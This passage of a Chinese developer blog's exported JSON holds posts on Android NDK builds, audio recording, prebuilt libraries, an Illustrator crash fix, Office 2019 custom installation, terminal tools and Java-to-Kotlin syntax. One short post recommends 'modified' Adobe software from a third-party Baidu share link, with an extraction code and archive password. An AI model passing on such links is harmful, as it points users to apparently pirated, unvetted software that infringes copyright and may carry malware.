-Wno-write-stringsLOCAL_MODULE_TAGS := optionalinclude $(BUILD_SHARED_LIBRARY) Application.mk 不需要修改1234567$ vim Application.mkAPP_ABI := all # 所有abi平台，这里可以指定abi平台，多个用逗号隔开APP_PLATFORM := android-30# APP_STL := stlport_shared # 旧版ndk，如：`ndk;16.1.4479499` 用这个字段，新版不再支持APP_STL := c++_shared # 新版ndk，c++_static or c++_sharedAPP_CPPFLAGS += -fno-rttiAPP_ALLOW_MISSING_DEPS=true APP_STL stlport_static is no longer supported. Please switch to either c++_static or c++_shared. 二. 编译在 faac-1.28/jni 目录下执行1$ ndk-build 编译成功123456789101112$ tree ../libs/../libs/├── arm64-v8a│ └── libfaac.so├── armeabi-v7a│ └── libfaac.so├── x86│ └── libfaac.so└── x86_64 └── libfaac.so7 directories, 7 files 三. 使用预构建库 include/faaccfg.h faac.h libfaac.so 参考: 【Android Ndk使用预构建库】 TODO: 刚编译完，还没有时间在Android上测试这个库是否能跑。 B. cmake 编译 faac这个就比较简单，用 Android Studio 创建一个NDK的Android项目，将libfaac源码放进去，include放进去，剩下的就是和使用预构建库一样了：通过默认的JNI接口 native-lib.cpp调用 include的接口，在通过Java层调用 native-lib.cc就可以使用fAAC了，有空在记录一下这个过程。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"Android 录音简单示例","slug":"Android/Android 录音简单示例","date":"2021-03-07T14:52:36.000Z","updated":"2021-12-28T03:24:10.107Z","comments":true,"path":"Android/Android 录音简单示例/","link":"","permalink":"http://yoursite.com/Android/Android 录音简单示例/","excerpt":"","text":"1requestPermissions(new String[]&#123;\"android.permission.RECORD_AUDIO\"&#125;,1009); 12345678910111213141516171819202122232425262728293031323334class RecordAudioThread extends Thread&#123; AudioRecord recorder; @Override public void run() &#123; super.run(); int minBufferSize = AudioRecord.getMinBufferSize( 8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT); recorder = new AudioRecord( MediaRecorder.AudioSource.MIC, 8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBufferSize); recorder.startRecording(); byte[] audio = new byte[1024]; int readLength = 0; while (!isInterrupted())&#123; readLength = recorder.read(audio,0,audio.length); if(readLength &gt; 0)&#123; Log.d(TAG, \"录音长度：\" + readLength); &#125; &#125; recorder.stop(); recorder.release(); Log.i(Thread.currentThread().getName() , \"录音结束\"); &#125; &#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"录音","slug":"录音","permalink":"http://yoursite.com/tags/录音/"}]},{"title":"Android Ndk使用预构建库","slug":"Android/Android Ndk使用预构建库","date":"2021-02-26T11:52:36.000Z","updated":"2021-12-28T03:24:10.093Z","comments":true,"path":"Android/Android Ndk使用预构建库/","link":"","permalink":"http://yoursite.com/Android/Android Ndk使用预构建库/","excerpt":"","text":"fork 【官网指导页面】 【Android.mk语法】 【Application.mk语法】 NDK 支持使用预构建库（同时支持静态库和共享库）。此功能有以下两个主要用例： * 向第三方 NDK 开发者分发您自己的库，而不分发您的源代码。 * 使用您自己的库的预构建版本来提升构建速度。 声明预构建库 您必须将自己使用的每个预构建库声明为一个独立模块。为此，请执行以下步骤： 1. 为模块提供名称。此名称不需要与预构建库本身的名称相同。 2. 在模块的 Android.mk 文件中，将指向您提供的预构建库的路径分配到 LOCAL_SRC_FILES。指定 LOCAL_PATH 变量的值的相对路径。 &gt; 注意：您必须确保选择与您的目标 ABI 对应的预构建库版本。如需了解有关确保库支持 ABI 的详细信息，请参阅为预构建库选择 ABI。 3. 根据您使用的是共享库 (.so) 还是静态库 (.a)，添加 PREBUILT_SHARED_LIBRARY 或 PREBUILT_STATIC_LIBRARY。 下面这个简单的示例假设预构建库 libfoo.so 与描述它的 Android.mk 文件位于同一个目录中。 123456LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := foo-prebuiltLOCAL_SRC_FILES := libfoo.soinclude $(PREBUILT_SHARED_LIBRARY) 在此示例中，模块名称与预构建库的名称相同。 构建系统会将您的预构建共享库副本放入 $PROJECT/obj/local 中，而将另一个提取的调试信息的副本放入 $PROJECT/libs/ 中。此处，$PROJECT 是项目的根目录。从其他模块引用预构建库 如需从其他模块引用预构建库，请在与这些模块关联的 Android.mk 文件中，将该预构建库的名称指定为 LOCAL_STATIC_LIBRARIES 或 LOCAL_SHARED_LIBRARIES 变量的值。 例如，使用 libfoo.so 的模块的说明可能类似于以下内容： 12345include $(CLEAR_VARS)LOCAL_MODULE := foo-userLOCAL_SRC_FILES := foo-user.cLOCAL_SHARED_LIBRARIES := foo-prebuiltinclude $(BUILD_SHARED_LIBRARY) 此处，LOCAL_MODULE 是引用预构建库的模块的名称；LOCAL_SHARED_LIBRARIES 是预构建库本身的名称。导出预构建库的头文件 foo-user.c 中的代码取决于通常位于随预构建库分发的头文件（如 foo.h）中的特定声明。例如，foo-user.c 中可能会有类似于以下内容的一行代码：1#include &lt;foo.h&gt; 在这种情况下，如果您构建 foo-user 模块，需要提供头文件及其指向编译器的 include 路径。完成此任务的一个简单方法是在预构建模块定义中使用导出变量。例如，只要头文件 foo.h 位于与预构建模块关联的 include 目录下，您就可以按以下方式对其进行声明： 12345include $(CLEAR_VARS)LOCAL_MODULE := foo-prebuiltLOCAL_SRC_FILES := libfoo.soLOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/includeinclude $(PREBUILT_SHARED_LIBRARY) 此处的 LOCAL_EXPORT_C_INCLUDES 定义会确保构建系统导出指向预构建库的 include 目录的路径，针对依赖于预构建库的模块将该路径附加到 LOCAL_C_INCLUDES 的值开头。 此操作可让编译系统查找必需的标头。调试预构建库 建议您提供包含调试符号的预构建共享库。NDK 构建系统总是会从其安装到 $PROJECT/libs// 的那个版本的库中删除这些符号，但您可以使用调试版本通过 ndk-gdb 进行调试。为预构建库选择 ABI 请务必为您的目标 ABI 选择正确版本的预构建共享库。Android.mk 文件中的 TARGET_ARCH_ABI 变量可以将构建系统指向适当版本的库。 例如，假设您的项目包含库 libfoo.so 的以下两个版本： 12armeabi/libfoo.sox86/libfoo.so 以下代码段显示了如何使用 TARGET_ARCH_ABI，以便构建系统选择适当版本的库： 12345include $(CLEAR_VARS)LOCAL_MODULE := foo-prebuiltLOCAL_SRC_FILES := $(TARGET_ARCH_ABI)/libfoo.soLOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/includeinclude $(PREBUILT_SHARED_LIBRARY) 如果您已将 armeabi 指定为 TARGET_ARCH_ABI 的值，构建系统便会使用 armeabi 目录中的 libfoo.so 版本。如果您已将 x86 指定为 TARGET_ARCH_ABI 的值，构建系统便会使用 x86 目录中的版本。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"iOS App GUI设计尺寸","slug":"前端/手机设计尺寸","date":"2021-02-23T11:52:36.000Z","updated":"2021-12-28T03:24:10.257Z","comments":true,"path":"前端/手机设计尺寸/","link":"","permalink":"http://yoursite.com/前端/手机设计尺寸/","excerpt":"","text":"苹果人机界面指南【链接】 axure默认的尺寸","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"iPhone","slug":"iPhone","permalink":"http://yoursite.com/tags/iPhone/"}]},{"title":"Illustrator启动CANT错误","slug":"随笔/Illustrator启动CANT错误","date":"2021-01-22T13:32:37.000Z","updated":"2021-12-28T03:24:10.303Z","comments":true,"path":"随笔/Illustrator启动CANT错误/","link":"","permalink":"http://yoursite.com/随笔/Illustrator启动CANT错误/","excerpt":"","text":"问题在Windows10上家庭版安装完 Illustrator x64 ，在启动时崩溃并显示 CANT 错误的问题。 经过查资料，定位到是 Microsoft Visual C++ Redistributable 这个库的问题。 转到 控制面板 &gt; 程序 &gt; 程序和功能，发现我的系统中， Microsoft Visual C++ Redistributable 2012 这个库只有x86的，没有x64的，而安装的Illustrator是x64的。 找到问题了，那就好办了。 解决 先下载VC++ 2012 x64安装。 删除文件夹： 用户名 &gt; App Data &gt; Roaming &gt; Adobe &gt; Adobe Illustrator version-number Settings 。 重启电脑，OK！ 总结Illustrator的增效工具依赖于Visual C++，而且是依赖 Visual C++的 2012~2017版本 ，假如有些电脑缺少 VC ++ 2013 ，就需要安装VC ++ 2013，微软的官网有所有的VC++版本，地址：【最新支持的 Visual C++ 下载】 资料：启动时崩溃 | 缺少增效工具遇到 Illustrator 在启动时崩溃并显示缺少增效工具错误或 CANT 错误的问题？请按照下面提到的解决方法进行操作。 转到控制面板 &gt; 程序 &gt; 程序和功能。 右键单击 Microsoft Visual C++ Redistributable (2012~2017)，然后选取修复。 重置 Illustrator 首选项。Illustrator 首选项文件位于以下位置：[Windows] 用户名 &gt; App Data &gt; Roaming &gt; Adobe &gt; Adobe Illustrator version-number Settings[macOS] /用户/&lt;用户名&gt;/资源库/Preferences/Adobe Illustrator 24 Settings 重新启动计算机，然后打开 Illustrator。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[{"name":"Illustrator,AI","slug":"Illustrator-AI","permalink":"http://yoursite.com/tags/Illustrator-AI/"}]},{"title":"CCMarker使用记录","slug":"随笔/CCMarker使用记录","date":"2021-01-22T13:32:36.000Z","updated":"2021-12-28T03:24:10.303Z","comments":true,"path":"随笔/CCMarker使用记录/","link":"","permalink":"http://yoursite.com/随笔/CCMarker使用记录/","excerpt":"","text":"记录 无法下载这是网络原因，目前实测家庭网络可以下载，速度非常快，都是直接从官方的CDN下载。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[{"name":"ccmarker","slug":"ccmarker","permalink":"http://yoursite.com/tags/ccmarker/"}]},{"title":"VPOSY","slug":"随笔/vposy","date":"2021-01-22T13:32:36.000Z","updated":"2021-12-28T03:24:10.308Z","comments":true,"path":"随笔/vposy/","link":"","permalink":"http://yoursite.com/随笔/vposy/","excerpt":"","text":"微博@vposy 改装的软件更新很快，想用最新版本软件可以试试，下载地址:https://pan.baidu.com/s/1r3DezqdsUhnfaJb0ob2Iww#9yi4 提取码9yi4，压缩包如果有密码，解压密码为： @vposy","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[{"name":"adobe","slug":"adobe","permalink":"http://yoursite.com/tags/adobe/"}]},{"title":"Win10安装Office2019专业增强版自定义选择安装组件","slug":"随笔/Win10安装Office2019专业增强版自定义选择安装组件","date":"2021-01-06T13:32:36.000Z","updated":"2021-12-28T03:24:10.304Z","comments":true,"path":"随笔/Win10安装Office2019专业增强版自定义选择安装组件/","link":"","permalink":"http://yoursite.com/随笔/Win10安装Office2019专业增强版自定义选择安装组件/","excerpt":"","text":"零售版Office2019增强版是一个iso安装包，安装的时候不可以自定义安装组件，默认直接全部组件都安装上，我们一般只用到三大组件：Word、Excel、PPT，其他多余的：Sky，Access，Pusher，Outlook等组件想删掉又删不掉。 所以网上找了一下方法，可以自定义安装组件，而且是可以直接从微软的官网CDN直接下载安装，下载速度也不错。 安装 下载【officedeploymenttool.exe】 运行 【officedeploymenttool.exe】 导出 【setup.exe】，其他xml文件不要，可以删除。 在线 Office 自定义工具 这个网页可以生成一个配置文件，可以选择版本、组件等，我们也可以根据模板手动修改。 情况一(推荐)：配置在线CDN下载（cdn_config.xml）； 情况二：如果已经下载了Vol安装包（只支持Vol批量授权版，零售版不支持），所以选择本地源，选择你的Vol安装包路径（F:\\）。配置导出为local_config.xml文件。 配置文件中的&lt;ExcludeApp/&gt;标签就是要排除的组件，排除掉 Sky，Access，Pusher，Outlook等,只留下Word、Excel、PPT 和 OneNote，可以自己手动修改这个文件。 执行安装 情况一(推荐)：cmd 运行 setup.exe /configure cdn_config.xml ，会进行网络下载office，一般直接下载至 &quot;C:\\Program Files\\Microsoft Office\\Updates\\Download\\PackageFiles\\*** &quot;，下载完成之后，在移动到最终的目录。 情况二：cmd 运行 setup.exe /configure cdn_config.xml 安装本地的安装包。 完成。 配置文件 (推荐)cdn_config_word_execl_ppt.xml : 网络安装，只保留三大组件和OneNote。 12345678910111213141516171819202122232425&lt;Configuration ID=\"919e73d3-cf19-4b22-afa6-fba3c16d6afc\"&gt; &lt;Add OfficeClientEdition=\"64\" Channel=\"PerpetualVL2019\"&gt; &lt;Product ID=\"ProPlus2019Volume\" PIDKEY=\"NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP\"&gt; &lt;Language ID=\"zh-cn\" /&gt; &lt;ExcludeApp ID=\"Access\" /&gt; &lt;ExcludeApp ID=\"Groove\" /&gt; &lt;ExcludeApp ID=\"Lync\" /&gt; &lt;ExcludeApp ID=\"OneDrive\" /&gt; &lt;ExcludeApp ID=\"Outlook\" /&gt; &lt;ExcludeApp ID=\"Publisher\" /&gt; &lt;/Product&gt; &lt;/Add&gt; &lt;Property Name=\"SharedComputerLicensing\" Value=\"0\" /&gt; &lt;Property Name=\"SCLCacheOverride\" Value=\"0\" /&gt; &lt;Property Name=\"AUTOACTIVATE\" Value=\"0\" /&gt; &lt;Property Name=\"FORCEAPPSHUTDOWN\" Value=\"FALSE\" /&gt; &lt;Property Name=\"DeviceBasedLicensing\" Value=\"0\" /&gt; &lt;Updates Enabled=\"TRUE\" /&gt; &lt;RemoveMSI /&gt; &lt;AppSettings&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\excel\\options\" Name=\"defaultformat\" Value=\"51\" Type=\"REG_DWORD\" App=\"excel16\" Id=\"L_SaveExcelfilesas\" /&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\powerpoint\\options\" Name=\"defaultformat\" Value=\"27\" Type=\"REG_DWORD\" App=\"ppt16\" Id=\"L_SavePowerPointfilesas\" /&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\word\\options\" Name=\"defaultformat\" Value=\"\" Type=\"REG_SZ\" App=\"word16\" Id=\"L_SaveWordfilesas\" /&gt; &lt;/AppSettings&gt;&lt;/Configuration&gt; cdn_config_all.xml : 网络安装，全部组件都安装，可以手动删减 1234567891011121314151617181920&lt;Configuration ID=\"e53d0c83-a2ea-4ab4-8c94-754cbf3ca538\"&gt; &lt;Add OfficeClientEdition=\"64\" Channel=\"PerpetualVL2019\"&gt; &lt;Product ID=\"ProPlus2019Volume\" PIDKEY=\"NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP\"&gt; &lt;Language ID=\"zh-cn\" /&gt; &lt;ExcludeApp ID=\"Groove\" /&gt; &lt;/Product&gt; &lt;/Add&gt; &lt;Property Name=\"SharedComputerLicensing\" Value=\"0\" /&gt; &lt;Property Name=\"SCLCacheOverride\" Value=\"0\" /&gt; &lt;Property Name=\"AUTOACTIVATE\" Value=\"0\" /&gt; &lt;Property Name=\"FORCEAPPSHUTDOWN\" Value=\"FALSE\" /&gt; &lt;Property Name=\"DeviceBasedLicensing\" Value=\"0\" /&gt; &lt;Updates Enabled=\"TRUE\" /&gt; &lt;RemoveMSI /&gt; &lt;AppSettings&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\excel\\options\" Name=\"defaultformat\" Value=\"51\" Type=\"REG_DWORD\" App=\"excel16\" Id=\"L_SaveExcelfilesas\" /&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\powerpoint\\options\" Name=\"defaultformat\" Value=\"27\" Type=\"REG_DWORD\" App=\"ppt16\" Id=\"L_SavePowerPointfilesas\" /&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\word\\options\" Name=\"defaultformat\" Value=\"\" Type=\"REG_SZ\" App=\"word16\" Id=\"L_SaveWordfilesas\" /&gt; &lt;/AppSettings&gt;&lt;/Configuration&gt; vol_local_conf.xml : vol本地安装，修改SourcePath为真实路径即可，比如我这里的“F:\\” 1234567891011121314151617181920212223242526&lt;Configuration ID=\"cf21b3d3-631b-4a5f-8e22-dba237fe668c\"&gt; &lt;Add OfficeClientEdition=\"64\" Channel=\"PerpetualVL2019\" SourcePath=\"F:\\\" AllowCdnFallback=\"TRUE\"&gt; &lt;Product ID=\"ProPlus2019Volume\" PIDKEY=\"NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP\"&gt; &lt;Language ID=\"zh-cn\" /&gt; &lt;ExcludeApp ID=\"Access\" /&gt; &lt;ExcludeApp ID=\"Groove\" /&gt; &lt;ExcludeApp ID=\"Lync\" /&gt; &lt;ExcludeApp ID=\"OneDrive\" /&gt; &lt;ExcludeApp ID=\"OneNote\" /&gt; &lt;ExcludeApp ID=\"Outlook\" /&gt; &lt;ExcludeApp ID=\"Publisher\" /&gt; &lt;/Product&gt; &lt;/Add&gt; &lt;Property Name=\"SharedComputerLicensing\" Value=\"0\" /&gt; &lt;Property Name=\"SCLCacheOverride\" Value=\"0\" /&gt; &lt;Property Name=\"AUTOACTIVATE\" Value=\"0\" /&gt; &lt;Property Name=\"FORCEAPPSHUTDOWN\" Value=\"FALSE\" /&gt; &lt;Property Name=\"DeviceBasedLicensing\" Value=\"0\" /&gt; &lt;Updates Enabled=\"TRUE\" /&gt; &lt;RemoveMSI /&gt; &lt;AppSettings&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\excel\\options\" Name=\"defaultformat\" Value=\"51\" Type=\"REG_DWORD\" App=\"excel16\" Id=\"L_SaveExcelfilesas\" /&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\powerpoint\\options\" Name=\"defaultformat\" Value=\"27\" Type=\"REG_DWORD\" App=\"ppt16\" Id=\"L_SavePowerPointfilesas\" /&gt; &lt;User Key=\"software\\microsoft\\office\\16.0\\word\\options\" Name=\"defaultformat\" Value=\"\" Type=\"REG_SZ\" App=\"word16\" Id=\"L_SaveWordfilesas\" /&gt; &lt;/AppSettings&gt;&lt;/Configuration&gt;","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"开源的终端神器Tabby","slug":"随笔/免费的终端神器Tabby","date":"2020-12-31T13:32:36.000Z","updated":"2021-12-31T07:27:54.107Z","comments":true,"path":"随笔/免费的终端神器Tabby/","link":"","permalink":"http://yoursite.com/随笔/免费的终端神器Tabby/","excerpt":"","text":"官网：https://tabby.sh/开源地址：https://github.com/Eugeny/tabby下载地址：https://github.com/Eugeny/tabby/releases/tag/v1.0.169 Tabby（原名 Terminus）是一个简洁风格的终端，支持 SSH 、串口、Raw Socket 和 Telent，使用 TypeScript + Electron 开发。 缺点：Electron开发的东西通病-&gt; 安装包大（解压大概338MB），占用内存高（一个标签大概要250MB内存）优点：界面流畅、简洁 新建一个SSH会话 快捷入口&amp;连接历史","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"免费的终端神器MobaXterm","slug":"随笔/免费的终端神器MobaXterm","date":"2020-11-25T13:32:36.000Z","updated":"2021-12-31T07:25:30.238Z","comments":true,"path":"随笔/免费的终端神器MobaXterm/","link":"","permalink":"http://yoursite.com/随笔/免费的终端神器MobaXterm/","excerpt":"","text":"官网：https://mobaxterm.mobatek.net/ 有收费的，但开源免费版足够使用：https://download.mobatek.net/2052020102712115/MobaXterm_Portable_v20.5.zip 支持SSH，FTP，串口，VNC，X server和标签。 优点：占用内存小，开一个标签时就30MB左右，支持同时输入多台机器。内置的远程目录非常方便，可以随时上传/下载文件。 缺点：进后台一段时间会触发屏保（企鹅），鼠标点击一下可以关闭屏保（收费版可以永久关闭），但关闭之后使用会有一点点卡的感觉，可能就是台省着用内存的原因（Tabby一上来就用了250MB内存）。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"Android 软键盘底部输入框","slug":"Android/Android 软键盘底部输入框","date":"2020-11-20T11:52:36.000Z","updated":"2021-12-28T03:24:10.108Z","comments":true,"path":"Android/Android 软键盘底部输入框/","link":"","permalink":"http://yoursite.com/Android/Android 软键盘底部输入框/","excerpt":"","text":"备忘一下这个底部输入框的效果： 用DialogFragment实现挺方便的，大致的方法就是创建一个底部DialogFragment，布局内EditText聚焦，用代码主动弹出软键盘来。 12345678910111213141516171819202122232425262728293031323334class BottomInputFragment : DialogFragment()&#123; override fun onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) setStyle(STYLE_NO_TITLE, R.style.BottomInputDialog) &#125; override fun onStart() &#123; super.onStart() val window = dialog!!.window dialog!!.setCanceledOnTouchOutside(true) val params = window!!.attributes params.gravity = Gravity.BOTTOM params.width = WindowManager.LayoutParams.MATCH_PARENT window.attributes = params &#125; override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? &#123; return inflater.inflate(R.layout.dialog_edittext, container, false) &#125; override fun onViewCreated(view: View, savedInstanceState: Bundle?) &#123; super.onViewCreated(view, savedInstanceState) val editText = view.findViewById&lt;EditText&gt;(R.id.editText) showSoftInputFromWindow(editText) &#125; fun showSoftInputFromWindow(editText: EditText) &#123; editText.isFocusable = true editText.isFocusableInTouchMode = true editText.requestFocus() val inputManager: InputMethodManager = editText.context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager inputManager.showSoftInput(editText, 0) &#125;&#125; 弹框的Style R.style.BottomInputDialog1234567 &lt;style name=\"BottomInputDialog\" parent=\"AppTheme\"&gt; &lt;item name=\"android:layout_width\"&gt;match_parent&lt;/item&gt; &lt;item name=\"android:layout_height\"&gt;wrap_content&lt;/item&gt; &lt;item name=\"android:windowIsFloating\"&gt;true&lt;/item&gt; &lt;item name=\"android:backgroundDimEnabled\"&gt;false&lt;/item&gt; &lt;item name=\"android:windowSoftInputMode\"&gt;stateAlwaysVisible&lt;/item&gt;&lt;/style&gt; 弹框的布局 R.layout.dialog_edittext123456789101112131415161718192021222324252627282930313233343536373839&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:orientation=\"vertical\" android:background=\"#fff\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\"&gt; &lt;View android:layout_width=\"match_parent\" android:layout_height=\"1px\" android:background=\"#3e3e3e\"/&gt; &lt;EditText android:id=\"@+id/editText\" android:layout_width=\"match_parent\" android:layout_height=\"100dp\" android:padding=\"8dp\" android:gravity=\"start|top\" android:background=\"#efefef\" android:layout_margin=\"16dp\" android:maxLines=\"1\" android:focusable=\"true\" android:focusableInTouchMode=\"true\" android:hint=\"友善是交流的起点\" android:inputType=\"textMultiLine\"/&gt; &lt;Button android:layout_width=\"60dp\" android:layout_height=\"40dp\" android:layout_gravity=\"end\" android:layout_marginEnd=\"16dp\" android:layout_marginBottom=\"8dp\" android:textSize=\"14sp\" android:text=\"发布\"/&gt; &lt;View android:layout_width=\"match_parent\" android:layout_height=\"1px\" android:background=\"#3e3e3e\"/&gt;&lt;/LinearLayout&gt; 调用12345fun show() &#123; val fm: FragmentManager = supportFragmentManager val bif = BottomInputFragment() bif.show(fm, \"bif\")&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"软键盘","slug":"软键盘","permalink":"http://yoursite.com/tags/软键盘/"}]},{"title":"Android Vector两种形式","slug":"Android/Android Vector两种形式","date":"2020-10-26T01:52:36.000Z","updated":"2021-12-28T03:24:10.104Z","comments":true,"path":"Android/Android Vector两种形式/","link":"","permalink":"http://yoursite.com/Android/Android Vector两种形式/","excerpt":"","text":"利用IDE内置的创建Android机器人默认路径如下123&lt;path android:pathData=&quot;M17.6,11.48 L19.44,8.3a0.63,0.63 0,0 0,-1.09 -0.63l-1.88,3.24a11.43,11.43 0,0 0,-8.94 0L5.65,7.67a0.63,0.63 0,0 0,-1.09 0.63L6.4,11.48A10.81,10.81 0,0 0,1 20L23,20A10.81,10.81 0,0 0,17.6 11.48ZM7,17.25A1.25,1.25 0,1 1,8.25 16,1.25 1.25,0 0,1 7,17.25ZM17,17.25A1.25,1.25 0,1 1,18.25 16,1.25 1.25,0 0,1 17,17.25Z&quot; android:fillColor=&quot;#FF000000&quot;/&gt; 填充色 fillColor 改为 线条 strokeColor，设置一下宽度为1，效果如下：1234&lt;path android:pathData=&quot;M17.6,11.48 L19.44,8.3a0.63,0.63 0,0 0,-1.09 -0.63l-1.88,3.24a11.43,11.43 0,0 0,-8.94 0L5.65,7.67a0.63,0.63 0,0 0,-1.09 0.63L6.4,11.48A10.81,10.81 0,0 0,1 20L23,20A10.81,10.81 0,0 0,17.6 11.48ZM7,17.25A1.25,1.25 0,1 1,8.25 16,1.25 1.25,0 0,1 7,17.25ZM17,17.25A1.25,1.25 0,1 1,18.25 16,1.25 1.25,0 0,1 17,17.25Z&quot; android:strokeWidth=&quot;1&quot; android:strokeColor=&quot;#FF000000&quot;/&gt;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Vector","slug":"Vector","permalink":"http://yoursite.com/tags/Vector/"}]},{"title":"JDK 15 新特性","slug":"Java/JDK 15 新特性","date":"2020-09-15T11:51:41.000Z","updated":"2021-12-30T08:21:11.257Z","comments":true,"path":"Java/JDK 15 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 15 新特性/","excerpt":"","text":"2020年9月15日 JDK 15 发布，非 LTS 版本。 新特性 339: Edwards-Curve Digital Signature Algorithm (EdDSA) 360: Sealed Classes (Preview) 371: Hidden Classes 372: Remove the Nashorn JavaScript Engine 373: Reimplement the Legacy DatagramSocket API 374: Disable and Deprecate Biased Locking 375: Pattern Matching for instanceof (Second Preview) 377: ZGC: A Scalable Low-Latency Garbage Collector 378: Text Blocks 379: Shenandoah: A Low-Pause-Time Garbage Collector 381: Remove the Solaris and SPARC Ports 383: Foreign-Memory Access API (Second Incubator) 384: Records (Second Preview) 385: Deprecate RMI Activation for Removal 中文 339: 使用Edwards-Curve数字签名算法（EdDSA）实现加密签名 360: 密封类 Sealed Classes (Preview) 371: 隐藏类 Hidden Classes 372: 删除Nashorn JavaScript脚本引擎和API，以及jjs工具 373: 重新实现旧版DatagramSocket API，代替java.net.DatagramSocket和java.net.MulticastSocketAPI的基础实现 374: 默认情况下禁用偏向锁，并弃用所有相关的命令行选项。 375: 通过对instanceof运算符进行模式匹配来增强Java编程语言(Second Preview) 377: 将ZGC垃圾收集器从实验功能更改为产品功能。 378: 将文本块添加到Java语言 379: Shenandoah垃圾回收从实验特性变为产品特性。 381: 删除源代码并构建对Solaris/SPARC，Solaris/x64和Linux/SPARC端口的支持 383: 引入一个API，以允许Java程序安全有效地访问Java堆之外的外部内存。 384: Records提供了一种紧凑的语法来声明类，以帮助开发者写出更简洁的代码(Second Preview) 385: 弃用RMI激活机制以便将来删除 Sealed Classes (Preview) 密封类，通过sealed关键字修饰抽象类限定只允许指定的子类才可以实现或继承抽象类，避免抽象类被滥用。","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"from-java-to-kotlin","slug":"Kotlin/from-java-to-kotlin","date":"2020-08-25T14:52:36.000Z","updated":"2021-12-28T03:24:10.159Z","comments":true,"path":"Kotlin/from-java-to-kotlin/","link":"","permalink":"http://yoursite.com/Kotlin/from-java-to-kotlin/","excerpt":"","text":"根据 from-java-to-kotlin 的学习笔记 null声明 Java 12String otherName;otherName = null; Kotlin 12var otherName : String?otherName = null 空判断 Java 123if (text != null) &#123; int length = text.length();&#125; Kotlin 12345text?.let &#123; val length = text.length&#125;// or simplyval length = text?.length 数组初始化 Java 123byte[] data = new byte[200];int[] int_data = new int[100];String[] data_str = new String[100]; Kotlin 123val data = ByteArray(200)val int_data = IntArray(100)val data_str = arrayOfNulls&lt;String&gt;(100) 字符串拼接 Java 123String firstName = \"Amit\";String lastName = \"Shekhar\";String message = \"My name is: \" + firstName + \" \" + lastName; Kotlin 123val firstName = \"Amit\"val lastName = \"Shekhar\"val message = \"My name is: $firstName $lastName\" 换行 Java 123String text = \"First Line\\n\" + \"Second Line\\n\" + \"Third Line\"; Kotlin 12345val text = \"\"\" |First Line |Second Line |Third Line \"\"\".trimMargin() 三元表达式 Java 1String text = x &gt; 5 ? \"x &gt; 5\" : \"x &lt;= 5\"; Kotlin 123val text = if (x &gt; 5) \"x &gt; 5\" else \"x &lt;= 5\" 操作符 java 123456final int andResult = a &amp; b;final int orResult = a | b;final int xorResult = a ^ b;final int rightShift = a &gt;&gt; 2;final int leftShift = a &lt;&lt; 2;final int unsignedRightShift = a &gt;&gt;&gt; 2; Kotlin 123456val andResult = a and bval orResult = a or bval xorResult = a xor bval rightShift = a shr 2val leftShift = a shl 2val unsignedRightShift = a ushr 2 类型判断和转换 (声明式) Java 123if (object instanceof Car) &#123;&#125;Car car = (Car) object; Kotlin 123if (object is Car) &#123;&#125;var car = object as Car 类型判断和转换 (隐式) Java 123if (object instanceof Car) &#123; Car car = (Car) object;&#125; Kotlin 123if (object is Car) &#123; var car = object // 聪明的转换&#125; 多重条件 Java 1if (score &gt;= 0 &amp;&amp; score &lt;= 300) &#123; &#125; Kotlin 1if (score in 0..300) &#123; &#125; 更灵活的case语句 Java 123456789101112131415161718192021222324int score = // some score;String grade;switch (score) &#123; case 10: case 9: grade = \"Excellent\"; break; case 8: case 7: case 6: grade = \"Good\"; break; case 5: case 4: grade = \"OK\"; break; case 3: case 2: case 1: grade = \"Fail\"; break; default: grade = \"Fail\";&#125; Kotlin 12345678var score = // some scorevar grade = when (score) &#123; 9, 10 -&gt; \"Excellent\" in 6..8 -&gt; \"Good\" 4, 5 -&gt; 